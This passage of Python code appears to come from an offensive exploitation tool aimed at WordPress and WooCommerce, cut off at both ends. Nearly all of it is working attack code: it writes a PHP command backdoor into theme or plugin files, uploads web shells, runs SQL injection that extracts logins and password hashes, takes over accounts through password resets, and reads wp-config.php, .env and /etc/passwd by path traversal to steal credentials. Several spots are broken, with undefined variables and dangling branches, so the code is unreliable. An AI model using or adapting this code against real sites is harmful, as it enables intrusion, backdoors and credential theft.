                editor_url = theme_editor_url
                edit_type = 'theme'
            
            # Step 3: Find a file to edit
            soup = BeautifulSoup(response.text, 'html.parser')
            files = []
            
            if edit_type == 'theme':
                file_links = soup.select('div.theme-editor-php a')
            else:
                file_links = soup.select('div.plugin-editor-php a')
            
            for link in file_links:
                href = link.get('href', '')
                if ('theme-editor.php' in href or 'plugin-editor.php' in href) and 'file=' in href:
                    files.append(href)
            
            if not files:
                result['status'] = 'failed'
                result['reason'] = f'Could not find any editable {edit_type} files'
                return result
            
            # Choose a PHP file to edit
            php_files = [f for f in files if f.endswith('.php')]
            if not php_files:
                edit_file = files[0]  # Use any file if no PHP files found
            else:
                edit_file = php_files[0]  # Use the first PHP file
                
            # Step 4: Edit the file to include backdoor code
            file_url = urljoin(self.target, edit_file)
            response = self.session.get(file_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200:
                result['status'] = 'failed'
                result['reason'] = 'Could not access the file to edit'
                return result
            
            # Extract the nonce and file path
            soup = BeautifulSoup(response.text, 'html.parser')
            nonce = ''
            nonce_field = soup.select_one('input[name="_wpnonce"]')
            if nonce_field:
                nonce = nonce_field.get('value', '')
            
            file_path = ''
            file_field = soup.select_one('input[name="file"]')
            if file_field:
                file_path = file_field.get('value', '')
            
            if not nonce or not file_path:
                result['status'] = 'failed'
                result['reason'] = 'Could not extract necessary form fields'
                return result
            
            # Get the current content and add our backdoor
            content_textarea = soup.select_one('textarea#newcontent')
            if not content_textarea:
                result['status'] = 'failed'
                result['reason'] = 'Could not find content textarea'
                return result
            
            current_content = content_textarea.text
            backdoor_code = '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); exit; } ?>'
            
            # Check if the file already has PHP tags
            if '<?php' in current_content:
                new_content = current_content.replace('<?php', f'{backdoor_code}\n<?php', 1)
            else:
                new_content = f'{backdoor_code}\n{current_content}'
            
            # Step 5: Submit the edit form
            edit_data = {
                '_wpnonce': nonce,
                '_wp_http_referer': file_url,
                'newcontent': new_content,
                'action': 'update',
                'file': file_path,
                'theme': soup.select_one('input[name="theme"]').get('value', '') if edit_type == 'theme' else '',
                'plugin': soup.select_one('input[name="plugin"]').get('value', '') if edit_type == 'plugin' else '',
                'submit': 'Update File'
            }
            
            response = self.session.post(file_url, data=edit_data, headers=self.headers, timeout=self.timeout, verify=False)
            
            # Step 6: Check if the edit was successful
            if response.status_code == 200 and ('File edited successfully' in response.text or 'updated successfully' in response.text):
                # Try to find the actual path of the file on the server
                if edit_type == 'theme':
                    shell_path = f"{self.target}/wp-content/themes/{file_path.split('/')[-2]}/{file_path.split('/')[-1]}"
                else:
                    shell_path = f"{self.target}/wp-content/plugins/{file_path.split('/')[-2]}/{file_path.split('/')[-1]}"
                

            else:
                result['status'] = 'failed'
                result['reason'] = 'Failed to update file'
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result
    
    def _exploit_wp_file_manager_rce(self, vuln):
        """Exploit WP File Manager RCE (CVE-2020-25213)"""
        result = {
            'vulnerability': vuln.get('title', 'WP File Manager - Remote Code Execution'),
            'status': 'unknown',
            'type': 'Remote Code Execution',
            'data': {}
        }
        
        try:

            plugins_url = f"{self.target}/wp-content/plugins/wp-file-manager/"
            response = self.session.get(plugins_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200:
                result['status'] = 'failed'
                result['reason'] = 'WP File Manager plugin not found'
                return result
            

            payload_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '.php'
            php_payload = '<?php echo "WPFM Shell"; system($_GET["cmd"]); ?>'
            

            zip_payload = io.BytesIO()
            with zipfile.ZipFile(zip_payload, 'w') as zipf:
                zipf.writestr(payload_name, php_payload)
            zip_payload.seek(0)
            

            upload_url = f"{self.target}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
            
            files = {
                'upload[]': (f"{payload_name}.zip", zip_payload.getvalue(), 'application/zip')
            }
            
            data = {
                'cmd': 'upload',
                'target': 'l1_Lw'  # This is the target directory (root)
            }
            
            response = self.session.post(upload_url, files=files, data=data, headers=self.headers, timeout=self.timeout, verify=False)
            

            if response.status_code == 200 and '"added"' in response.text:

                extract_url = upload_url
                
                data = {
                    'cmd': 'extract',
                    'target': f"l1_UL{payload_name}.zip",  # Target the uploaded ZIP
                    'current': 'l1_Lw'  # Current directory (root)
                }
                
                response = self.session.post(extract_url, data=data, headers=self.headers, timeout=self.timeout, verify=False)
                

                potential_paths = [
                    f"{self.target}/{payload_name}",
                    f"{self.target}/wp-content/plugins/wp-file-manager/{payload_name}",
                    f"{self.target}/wp-content/plugins/{payload_name}"
                ]
                
                for path in potential_paths:
                    try:
                        response = self.session.get(path, headers=self.headers, timeout=self.timeout, verify=False)
                        if response.status_code == 200 and "WPFM Shell" in response.text:
                            result['status'] = 'success'
                            result['data']['shell_url'] = path
                            result['details'] = f"Successfully uploaded shell to {path}"
                            

                            test_url = f"{path}?cmd={test_cmd}"
                            response = self.session.get(test_url, headers=self.headers, timeout=self.timeout, verify=False)
                            
                            if "WPFM_RCE_SUCCESSFUL" in response.text:
                                result['data']['command_execution'] = True
                            else:
                                result['data']['command_execution'] = False
                            
                            break
                    except Exception:
                        continue
                else:
                    result['status'] = 'partial'
                    result['reason'] = 'ZIP upload successful but could not find extracted shell'
            else:
                result['status'] = 'failed'
                result['reason'] = 'Failed to upload payload'
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result
    
    def _exploit_wpdatatables_sqli(self, vuln):
        """Exploit wpDataTables SQL Injection vulnerability (CVE-2023-26540)"""
        result = {
            'vulnerability': vuln.get('title', 'wpDataTables - SQL Injection'),
            'status': 'unknown',
            'type': 'SQL Injection',
            'data': {}
        }
        
        try:

            plugin_url = f"{self.target}/wp-content/plugins/wpdatatables/"
            response = self.session.get(plugin_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200:
                result['status'] = 'failed'
                result['reason'] = 'wpDataTables plugin not found'
                return result
            

            base_url = f"{self.target}/wp-admin/admin-ajax.php?action=get_wdtable&tablepress_id="
            

            test1_payload = "1"
            test1_url = f"{base_url}{test1_payload}"
            response1 = self.session.get(test1_url, headers=self.headers, timeout=self.timeout, verify=False)
            

            test2_payload = "1' AND (SELECT SLEEP(5))='0"
            test2_url = f"{base_url}{test2_payload}"
            
            start_time = time.time()
            response2 = self.session.get(test2_url, headers=self.headers, timeout=max(self.timeout, 10), verify=False)
            end_time = time.time()
            

            if (end_time - start_time) > 4.5:  # Should be at least 4.5 seconds if SLEEP(5) executed
                result['status'] = 'success'
                result['details'] = "SQL injection vulnerability confirmed via time-based technique"
                

                extracted_data = {}
                

                prefix_payload = "1' UNION SELECT 1,2,3,table_name,5,6,7,8,9,10 FROM information_schema.tables WHERE table_name LIKE '%options' LIMIT 1-- -"
                prefix_url = f"{base_url}{prefix_payload}"
                prefix_response = self.session.get(prefix_url, headers=self.headers, timeout=self.timeout, verify=False)
                
                prefix_match = re.search(r'wp_\w*options', prefix_response.text)
                if prefix_match:
                    db_prefix = prefix_match.group(0).replace('options', '')
                    extracted_data['db_prefix'] = db_prefix
                    

                    user_payload = f"1' UNION SELECT 1,2,3,user_login,5,6,7,8,9,10 FROM {db_prefix}users WHERE id=1-- -"
                    user_url = f"{base_url}{user_payload}"
                    user_response = self.session.get(user_url, headers=self.headers, timeout=self.timeout, verify=False)
                    

                    user_data = user_response.text
                    if 'admin' in user_data.lower():
                        username_match = re.search(r'"data":"([^"]+)"', user_data)
                        if username_match:
                            extracted_data['admin_username'] = username_match.group(1)
                    

                    version_payload = f"1' UNION SELECT 1,2,3,option_value,5,6,7,8,9,10 FROM {db_prefix}options WHERE option_name='blogname'-- -"
                    version_url = f"{base_url}{version_payload}"
                    version_response = self.session.get(version_url, headers=self.headers, timeout=self.timeout, verify=False)
                    
                    if version_response.status_code == 200:
                        version_match = re.search(r'"data":"([^"]+)"', version_response.text)
                        if version_match:
                            extracted_data['site_name'] = version_match.group(1)
                
                result['data']['extracted_info'] = extracted_data
                

                with open(os.path.join(self.exploits_dir, 'wpdatatables_sqli.json'), 'w') as f:
                    json.dump({
                        'vulnerable_url': base_url,
                        'test_payload': test2_payload,
                        'extracted_data': extracted_data
                    }, f, indent=4)
            else:
                result['status'] = 'failed'
                result['reason'] = 'SQL injection test failed (no time delay observed)'
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result
        
    def _exploit_password_reset_token_leak(self, vuln):
        """Exploit WordPress password reset token leak vulnerability"""
        result = {
            'vulnerability': vuln.get('title', 'WordPress Password Reset Token Exposure'),
            'status': 'unknown',
            'type': 'Information Disclosure',
            'data': {}
        }
        
        try:

            username = vuln.get('additional_info', {}).get('username')
            reset_key = vuln.get('additional_info', {}).get('reset_key')
            
            if not username or not reset_key:
                result['status'] = 'failed'
                result['reason'] = 'Missing required information (username or reset key)'
                return result
            

            reset_url = f"{self.target}/wp-login.php?action=rp&key={reset_key}&login={username}"
            response = self.session.get(reset_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200 or 'Reset Password' not in response.text:
                result['status'] = 'failed'
                result['reason'] = 'Invalid reset key or the link has expired'
                return result
            

            soup = BeautifulSoup(response.text, 'html.parser')
            form = soup.find('form', {'name': 'resetpassform'})
            
            if not form:
                result['status'] = 'failed'
                result['reason'] = 'Could not find password reset form'
                return result
            

            rp_key = None
            key_field = form.find('input', {'name': 'rp_key'})
            if key_field:
                rp_key = key_field.get('value', '')
            

            new_password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))  # Generate a strong password
            
            reset_data = {
                'pass1': new_password,
                'pass2': new_password,
                'wp-submit': 'Reset Password',
                'rp_key': rp_key,
                'rp_login': username
            }
            
            response = self.session.post(reset_url, data=reset_data, headers=self.headers, timeout=self.timeout, verify=False)
            

            if response.status_code == 200 and 'password has been reset' in response.text.lower():
                result['status'] = 'success'
                result['data']['username'] = username
                result['data']['new_password'] = new_password
                result['details'] = f"Successfully reset password for user {username}"
                

                login_url = f"{self.target}/wp-login.php"
                login_data = {
                    'log': username,
                    'pwd': new_password,
                    'wp-submit': 'Log In',
                    'redirect_to': f"{self.target}/wp-admin/",
                    'testcookie': '1'
                }
                
                response = self.session.post(login_url, data=login_data, headers=self.headers, timeout=self.timeout, verify=False, allow_redirects=True)
                
                if 'wp-admin' in response.url:
                    result['data']['login_verified'] = True
                    

                else:
                    result['data']['login_verified'] = False
            else:
                result['status'] = 'failed'
                result['reason'] = 'Failed to reset password'
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result

    def _is_woocommerce_active(self):
        """
        Checks if WooCommerce is active using multiple detection methods.
        Returns True if detected, False otherwise.
        """

        woo_urls = [
            f"{self.target}/wp-content/plugins/woocommerce/",
            f"{self.target}/wp-content/plugins/woocommerce-extra/",
            f"{self.target}/wp-content/plugins/woo-",
        ]
        
        for url in woo_urls:
            try:
                response = self.session.get(url, headers=self.headers, timeout=self.timeout, verify=False)
                if response.status_code == 200:
                    return True
            except Exception:
                continue
        

        try:
            home_response = self.session.get(self.target, headers=self.headers, timeout=self.timeout, verify=False)
            if home_response.status_code == 200:

                woo_indicators = [
                    'woocommerce',
                    'add_to_cart',
                    'product_type',
                    'wc-',
                    'wc_add_to_cart',
                    'wc-proceed-to-checkout',
                    'woocommerce.min.css',
                    'woocommerce.css',
                    'woocommerce-',
                    'class="woocommerce',
                    'id="woocommerce',
                    'data-product_id'
                ]
                
                for indicator in woo_indicators:
                    if indicator in home_response.text.lower():
                        return True
        except Exception:
            pass
        

        api_endpoints = [
            f"{self.target}/wp-json/wc/v3",
            f"{self.target}/wp-json/wc/v2",
            f"{self.target}/wc-api/v3"
        ]
        
        for endpoint in api_endpoints:
            try:
                response = self.session.get(endpoint, headers=self.headers, timeout=self.timeout, verify=False)
                if response.status_code in [200, 401, 403]:
                    return True
            except Exception:
                continue
        

        shop_urls = [
            f"{self.target}/shop/",
            f"{self.target}/product/",
            f"{self.target}/cart/",
            f"{self.target}/checkout/",
            f"{self.target}/my-account/"
        ]
        
        for url in shop_urls:
            try:
                response = self.session.get(url, headers=self.headers, timeout=self.timeout, verify=False, allow_redirects=True)
                if response.status_code == 200 and ('woocommerce' in response.text.lower() or 'product' in response.text.lower()):
                    return True
            except Exception:
                continue
        
        return False
        
    def _exploit_woocommerce_file_download(self, vuln):
        """Exploit WooCommerce arbitrary file download vulnerability (CVE-2021-32620)"""
        result = {
            'vulnerability': vuln.get('title', 'WooCommerce Arbitrary File Download'),
            'status': 'unknown',
            'type': 'Information Disclosure',
            'data': {}
        }
        
        try:
            # Check if WooCommerce is installed
            if not self._is_woocommerce_active():
                result['status'] = 'failed'
                result['reason'] = 'WooCommerce not detected on this site'
                return result
            

            
            sensitive_files = [
                '/etc/passwd',                  # Unix user accounts
                '/proc/self/environ',           # Environment variables
                '../../../wp-config.php',       # WordPress configuration (includes DB credentials)
                '../../../.htaccess',           # Apache config
                '../../../.env',                # Environment file
                '../../../../../../etc/hosts'   # Hosts file
            ]
            
            extracted_files = {}
            
            for file_path in sensitive_files:
                try:
                    exploit_url = f"{self.target}/wp-json/wc/v3/products/reviews/logs?file={file_path}"
                    
                    headers = self.headers.copy()
                    headers['Accept'] = 'application/json'
                    
                    response = self.session.get(exploit_url, headers=headers, timeout=self.timeout, verify=False)
                    

                    if response.status_code == 200:
                        try:
    
                            content = response.json()
                            if isinstance(content, dict) and 'contents' in content:
                                extracted_files[file_path] = content['contents']
                                result['status'] = 'success'
                            elif isinstance(content, dict) and 'message' in content:
    
                                continue
                            else:
    
                                extracted_files[file_path] = response.text
                                result['status'] = 'success'
                        except json.JSONDecodeError:
    
                            extracted_files[file_path] = response.text
                            result['status'] = 'success'

                        alternative_url = f"{self.target}/wp-admin/admin-ajax.php?action=woocommerce_admin_products_export&file=../../../{file_path}"
                        response = self.session.get(alternative_url, headers=self.headers, timeout=self.timeout, verify=False)
                        
                        if response.status_code == 200 and len(response.text) > 0:
                            extracted_files[file_path] = response.text
                            result['status'] = 'success'
                except Exception as e:
                    print_verbose(f"Error accessing {file_path}: {str(e)}")
                    continue
            

                

                for file_path, content in extracted_files.items():
                    file_name = os.path.basename(file_path)
                    if not file_name:
                        file_name = file_path.replace('/', '_').replace('..', '').strip('_')
                    
                    with open(os.path.join(self.exploits_dir, f'woo_download_{file_name}'), 'w') as f:
                        f.write(content)
                

                if '../../../wp-config.php' in extracted_files:
                    config_content = extracted_files['../../../wp-config.php']
                    db_creds = {}
                    
                    for key in ['DB_NAME', 'DB_USER', 'DB_PASSWORD', 'DB_HOST']:
                        match = re.search(r"define\(\s*'"+key+r"',\s*'([^']*)'\s*\);", config_content)
                        if match:
                            db_creds[key] = match.group(1)
                    


                    for key in ['AUTH_KEY', 'SECURE_AUTH_KEY', 'LOGGED_IN_KEY', 'NONCE_KEY',
                                'AUTH_SALT', 'SECURE_AUTH_SALT', 'LOGGED_IN_SALT', 'NONCE_SALT']:
                        match = re.search(r"define\(\s*'"+key+r"',\s*'([^']*)'\s*\);", config_content)
                        if match:
                            auth_keys[key] = match.group(1)
                    

                    if db_creds:
                        result['data']['db_credentials'] = db_creds
                        
                        with open(os.path.join(self.exploits_dir, 'wp_db_credentials.json'), 'w') as f:
                            json.dump({
                                'db_credentials': db_creds,
                                'auth_keys': auth_keys
                            }, f, indent=4)
            else:
                result['status'] = 'failed'
                result['reason'] = 'Could not download any files'
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result

    def _exploit_woocommerce_sqli(self, vuln):
        """Exploit WooCommerce SQL Injection vulnerability (CVE-2021-32052)"""
        result = {
            'vulnerability': vuln.get('title', 'WooCommerce SQL Injection'),
            'status': 'unknown',
            'type': 'SQL Injection',
            'data': {}
        }
        
        try:
            # Check if WooCommerce is installed
            if not self._is_woocommerce_active():
                result['status'] = 'failed'
                result['reason'] = 'WooCommerce not detected on this site'
                return result
            

            woo_version = vuln.get('affected_version', '').replace('<=', '')
            

            

            order_params = {
                'action': 'woocommerce_json_search_order_items',
                'order_id': '1',
                'security': 'anything',  # CSRF token, but we can try with any value
                'term': 'product1'
            }
            

            injection_url = f"{self.target}/wp-admin/admin-ajax.php"
            

            order_params['term'] = '1" OR SLEEP(5) -- -'  # MySQL time-based injection
            
            start_time = time.time()
            response = self.session.post(injection_url, data=order_params, headers=self.headers, timeout=max(self.timeout, 10), verify=False)
            end_time = time.time()
            

            time_diff = end_time - start_time
            result['data']['time_diff'] = time_diff
            
            if time_diff > 4.5:
                result['status'] = 'success'
                result['details'] = f"SQL injection confirmed via time-based technique (delay: {time_diff:.2f}s)"
                

                extracted_data = {}
                

                info_payloads = [
                    # Get database version
                    ('1" UNION SELECT 1,2,3,VERSION(),5,6,7-- -', 'db_version'),
                    # Get database name
                    ('1" UNION SELECT 1,2,3,DATABASE(),5,6,7-- -', 'db_name'),
                    # Get current user
                    ('1" UNION SELECT 1,2,3,USER(),5,6,7-- -', 'db_user')
                ]
                

                for payload, data_key in info_payloads:
                    try:
                        order_params['term'] = payload
                        response = self.session.post(injection_url, data=order_params, headers=self.headers, timeout=self.timeout, verify=False)
                        
                        if response.status_code == 200:
    
                            data_match = re.search(r'"results":\s*\[\s*\{\s*"id":\s*"[^"]*",\s*"text":\s*"([^"]*)"', response.text)
                            if data_match:
                                extracted_data[data_key] = data_match.group(1)
                    except Exception:
                        pass
                

                try:

                    prefix_payload = '1" UNION SELECT 1,2,3,table_name,5,6,7 FROM information_schema.tables WHERE table_name LIKE "%users" LIMIT 1-- -'
                    order_params['term'] = prefix_payload
                    response = self.session.post(injection_url, data=order_params, headers=self.headers, timeout=self.timeout, verify=False)
                    
                    users_table = None
                    if response.status_code == 200:
                        table_match = re.search(r'"results":\s*\[\s*\{\s*"id":\s*"[^"]*",\s*"text":\s*"([^"]*)"', response.text)
                        if table_match:
                            users_table = table_match.group(1)
                            extracted_data['users_table'] = users_table
                    

                    if users_table:
                        users_payload = f'1" UNION SELECT 1,2,3,CONCAT(user_login, ":", user_pass),5,6,7 FROM {users_table} LIMIT 5-- -'
                        order_params['term'] = users_payload
                        response = self.session.post(injection_url, data=order_params, headers=self.headers, timeout=self.timeout, verify=False)
                        
                        if response.status_code == 200:
                            users_match = re.search(r'"results":\s*\[\s*\{\s*"id":\s*"[^"]*",\s*"text":\s*"([^"]*)"', response.text)
                            if users_match:
                                extracted_data['user_hashes'] = users_match.group(1)
                except Exception:
                    pass
                
                result['data']['extracted_info'] = extracted_data
                

                with open(os.path.join(self.exploits_dir, 'woocommerce_sqli.json'), 'w') as f:
                    json.dump({
                        'vulnerable_url': injection_url,
                        'extracted_data': extracted_data
                    }, f, indent=4)

                order_params = {
                    'action': 'woocommerce_json_search_products',
                    'security': 'anything',
                    'term': '1'
                }
                

                order_params['term'] = '1" OR SLEEP(5) -- -'
                
                start_time = time.time()
                response = self.session.post(injection_url, data=order_params, headers=self.headers, timeout=max(self.timeout, 10), verify=False)
                end_time = time.time()
                
                time_diff = end_time - start_time
                
                if time_diff > 4.5:
                    result['status'] = 'success'
                    result['details'] = f"SQL injection confirmed in products search via time-based technique (delay: {time_diff:.2f}s)"
                else:
                    result['status'] = 'failed'
                    result['reason'] = 'SQL injection test failed (no time delay observed)'
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result

    def _exploit_woocommerce_checkout_vulnerability(self, vuln):
        """Exploit WooCommerce Checkout Field Editor Vulnerability (CVE-2022-0409)"""
        result = {
            'vulnerability': vuln.get('title', 'WooCommerce Checkout Field Editor Vulnerability'),
            'status': 'unknown',
            'type': 'Improper Access Control',
            'data': {}
        }
        
        try:
            # Check if WooCommerce is installed
            if not self._is_woocommerce_active():
                result['status'] = 'failed'
                result['reason'] = 'WooCommerce not detected on this site'
                return result
                

            checkout_editor_url = f"{self.target}/wp-content/plugins/woocommerce-checkout-field-editor/"
            response = self.session.get(checkout_editor_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200:
                result['status'] = 'failed'
                result['reason'] = 'WooCommerce Checkout Field Editor plugin not found'
                return result
            

            

            checkout_fields_url = f"{self.target}/wp-json/wc/v3/settings/checkout"
            
            headers = self.headers.copy()
            headers['Accept'] = 'application/json'
            
            response = self.session.get(checkout_fields_url, headers=headers, timeout=self.timeout, verify=False)
            
            if response.status_code == 200:
                try:
                    field_data = response.json()
                    if isinstance(field_data, list) and len(field_data) > 0:
                        result['status'] = 'success'
                        result['data']['checkout_fields'] = field_data
                        result['details'] = f"Successfully accessed {len(field_data)} checkout field settings without authentication"
                        
            
                        new_field = {
                            "id": "checkout_test_field",
                            "label": "Test Field",
                            "description": "This field was added by exploit",
                            "type": "text",
                            "value": "test_value",
                            "default": "",
                            "tip": "This field demonstrates a vulnerability",
                            "placeholder": "Enter any value"
                        }
                        
                        modify_response = self.session.post(checkout_fields_url, json=new_field, headers=headers, timeout=self.timeout, verify=False)
                        
                        if modify_response.status_code in [200, 201]:
                            result['data']['field_modification'] = True
                            result['details'] += " and successfully modified checkout fields"
                        else:
                            result['data']['field_modification'] = False
                            result['details'] += " but field modification failed"
                        

                            json.dump(field_data, f, indent=4)
                    else:
                        result['status'] = 'partial'
                        result['reason'] = 'Accessed checkout API but no field data found'
                except json.JSONDecodeError:
                    result['status'] = 'failed'
                    result['reason'] = 'Response not in JSON format'

                alternative_url = f"{self.target}/wp-json/wc-checkout-editor/v1/fields"
                alt_response = self.session.get(alternative_url, headers=headers, timeout=self.timeout, verify=False)
                
                if alt_response.status_code == 200:
                    try:
                        alt_field_data = alt_response.json()
                        result['status'] = 'success'
                        result['data']['checkout_fields'] = alt_field_data
                        result['details'] = "Successfully accessed checkout fields via alternative endpoint"
                        

                        with open(os.path.join(self.exploits_dir, 'woocommerce_checkout_fields_alt.json'), 'w') as f:
                            json.dump(alt_field_data, f, indent=4)
                    except json.JSONDecodeError:
                        result['status'] = 'failed'
                        result['reason'] = 'Alternative response not in JSON format'
                else:
                    result['status'] = 'failed'
                    result['reason'] = 'Authentication required and alternative endpoint also protected'
            else:
                result['status'] = 'failed'
                result['reason'] = f"Unexpected response code: {response.status_code}"
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result
    
    def _exploit_woocommerce_product_rce(self, vuln):
        """Exploit WooCommerce Product Import Export Vulnerability (CVE-2021-4095)"""
        result = {
            'vulnerability': vuln.get('title', 'WooCommerce Product Import Export RCE'),
            'status': 'unknown',
            'type': 'Remote Code Execution',
            'data': {}
        }
        
        try:
            # Check if WooCommerce is installed
            if not self._is_woocommerce_active():
                result['status'] = 'failed'
                result['reason'] = 'WooCommerce not detected on this site'
                return result
                
            # Check if the Product Import Export plugin is active
            importer_url = f"{self.target}/wp-content/plugins/woocommerce-product-import-export/"
            response = self.session.get(importer_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200:
                # Try alternative plugin folder
                importer_url = f"{self.target}/wp-content/plugins/product-import-export-for-woo/"
                response = self.session.get(importer_url, headers=self.headers, timeout=self.timeout, verify=False)
                
                if response.status_code != 200:
                    result['status'] = 'failed'
                    result['reason'] = 'WooCommerce Product Import Export plugin not found'
                    return result
            

            

            payload_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            php_payload = '<?php echo "WOO_RCE_SHELL"; system($_GET["cmd"]); ?>'
            

            formula = f'=HYPERLINK("x:x","=cmd|\'echo {base64.b64encode(php_payload.encode()).decode()} | base64 -d > {payload_name}.php\'!A1")'
            
            csv_content = 'ID,Name,Description,Price\n'
            csv_content += f'1,Malicious Product,{formula},19.99\n'
            

            csv_file = io.BytesIO(csv_content.encode('utf-8'))
            

            import_page_url = f"{self.target}/wp-admin/admin.php?page=woocommerce_csv_import_suite"
            import_page_response = self.session.get(import_page_url, headers=self.headers, timeout=self.timeout, verify=False)
            

            upload_url = f"{self.target}/wp-admin/admin-ajax.php"
            

            files = {
                'file': ('malicious_products.csv', csv_file.getvalue(), 'text/csv')
            }
            
            data = {
                'action': 'woocommerce_csv_import_request',
                'security': '', # This would normally need a nonce, but the vulnerability might bypass it
                'import_type': 'product',
                'delimiter': ',',
                'merge_empty_cells': '0',
                'file_url': '',
                'override_existing': '1'
            }
            

            upload_response = self.session.post(upload_url, files=files, data=data, headers=self.headers, timeout=self.timeout, verify=False)
            

            if "error" not in upload_response.text.lower() and upload_response.status_code == 200:
                result['data']['upload_status'] = 'successful'
                

                potential_paths = [
                    f"{self.target}/{payload_name}.php",
                    f"{self.target}/wp-content/uploads/{payload_name}.php",
                    f"{self.target}/wp-content/uploads/woocommerce_uploads/{payload_name}.php",
                    f"{self.target}/wp-admin/{payload_name}.php",
                    f"{self.target}/wp-content/plugins/woocommerce/{payload_name}.php"
                ]
                
                for path in potential_paths:
                    try:
                        shell_response = self.session.get(path, headers=self.headers, timeout=self.timeout, verify=False)
                        if shell_response.status_code == 200 and "WOO_RCE_SHELL" in shell_response.text:
                            result['status'] = 'success'
                            result['data']['shell_url'] = path
                            result['details'] = f"Successfully uploaded shell to {path}"
                            

                            test_cmd = "echo WOO_RCE_SUCCESSFUL"
                            test_url = f"{path}?cmd={test_cmd}"
                            cmd_response = self.session.get(test_url, headers=self.headers, timeout=self.timeout, verify=False)
                            
                            if "WOO_RCE_SUCCESSFUL" in cmd_response.text:
                                result['data']['command_execution'] = True
                            else:
                                result['data']['command_execution'] = False
                            

                            with open(os.path.join(self.exploits_dir, 'woocommerce_rce_evidence.txt'), 'w') as f:
                                f.write(f"Shell URL: {path}\n")
                                f.write(f"Command execution test: {'Success' if result['data'].get('command_execution') else 'Failed'}\n")
                                f.write(f"Response content:\n{cmd_response.text[:500]}...\n")
                            
                            break
                    except Exception:
                        continue
                else:

                    try:

                        data_formula = '=IMPORTXML("file:///var/www/html/wp-config.php","//")'
                        csv_content = 'ID,Name,Description,Price\n'
                        csv_content += f'1,Data Extraction,{data_formula},29.99\n'
                        
                        csv_file = io.BytesIO(csv_content.encode('utf-8'))
                        files = {
                            'file': ('data_extract.csv', csv_file.getvalue(), 'text/csv')
                        }
                        
                        extract_response = self.session.post(upload_url, files=files, data=data, headers=self.headers, timeout=self.timeout, verify=False)
                        
                        if "processed" in extract_response.text.lower():
                            result['status'] = 'partial'
                            result['details'] = "File uploaded but shell not found. Formula injection might have worked."
                            result['data']['formula_injection'] = True
                        else:
                            result['status'] = 'failed'
                            result['reason'] = "Shell upload failed and formula injection failed"
                    except Exception as e:
                        result['status'] = 'failed'
                        result['reason'] = f"Shell upload failed and formula injection error: {str(e)}"
            else:
                result['status'] = 'failed'
                result['reason'] = "Failed to upload malicious CSV file"
                
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result
    
    def _exploit_wp_core_path_traversal(self, vuln):
        """Exploit WordPress Core Path Traversal vulnerability"""
        result = {
            'vulnerability': vuln.get('title', 'WordPress Core Path Traversal'),
            'status': 'unknown',
            'type': 'Path Traversal',
            'data': {}
        }
        
        print_info(f"Attempting to exploit WordPress core path traversal vulnerability...")
        
        try:

            

            endpoints = [
                f"{self.target}/wp-admin/load-scripts.php",
                f"{self.target}/wp-admin/load-styles.php"
            ]
            
            sensitive_files = [
                '../wp-config.php',     # WordPress configuration file with DB credentials
                '../../wp-config.php',  # Try one level up
                '../../../wp-config.php', # Try multiple levels
                '../.htaccess',         # Apache configuration
                '../../.htaccess',
                '../.env',              # Environment file
                '../../.env'
            ]
            
            extracted_files = {}
            
            for endpoint in endpoints:
                for file_path in sensitive_files:
                    try:
            
                        exploit_url = f"{endpoint}?load={file_path}"
                        print_verbose(f"Trying to access: {exploit_url}")
                        
                        response = self.session.get(exploit_url, headers=self.headers, timeout=self.timeout, verify=False)
                        

                        if response.status_code == 200 and ('DB_NAME' in response.text or 'ABSPATH' in response.text or 'table_prefix' in response.text):
                            extracted_files[file_path] = response.text
                            print_success(f"Successfully exploited path traversal to read {file_path}")
                            

                            if 'wp-config.php' in file_path:
                                db_creds = {}
                                

                                for key in ['DB_NAME', 'DB_USER', 'DB_PASSWORD', 'DB_HOST']:
                                    match = re.search(r"define\(\s*['\"]("+key+r")['\"],\s*['\"](.*?)['\"]\s*\);", response.text)
                                    if match:
                                        db_creds[key] = match.group(2)
                                

                                prefix_match = re.search(r"\$table_prefix\s*=\s*['\"]([^'\"]*)['\"];", response.text)
                                if prefix_match:
                                    db_creds['table_prefix'] = prefix_match.group(1)
                                

                                auth_keys = {}
                                for key in ['AUTH_KEY', 'SECURE_AUTH_KEY', 'LOGGED_IN_KEY', 'NONCE_KEY',
                                            'AUTH_SALT', 'SECURE_AUTH_SALT', 'LOGGED_IN_SALT', 'NONCE_SALT']:
                                    match = re.search(r"define\(\s*['\"]("+key+r")['\"],\s*['\"](.*?)['\"]\s*\);", response.text)
                                    if match:
                                        auth_keys[key] = match.group(2)
                                


                                with open(os.path.join(self.exploits_dir, '.htaccess'), 'w') as f:
                                    f.write(response.text)

                                with open(os.path.join(self.exploits_dir, '.env'), 'w') as f:
                                    f.write(response.text)
                    except Exception as e:
                        print_verbose(f"Error accessing {file_path} via {endpoint}: {str(e)}")
                        continue
            

                
    
                if any('wp-config.php' in file for file in extracted_files.keys()) and 'db_credentials' in result['data']:
                    result['data']['wordpress_credentials_found'] = True
                    print_success(f"WordPress database credentials extracted: DB_NAME={result['data']['db_credentials'].get('DB_NAME', 'Not found')}, DB_USER={result['data']['db_credentials'].get('DB_USER', 'Not found')}")
            else:
                result['status'] = 'failed'
                result['reason'] = 'Could not exploit path traversal vulnerability'
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
            print_error(f"Error during exploitation: {str(e)}")
        
        return result

    def _exploit_elementor_rce(self, vuln):
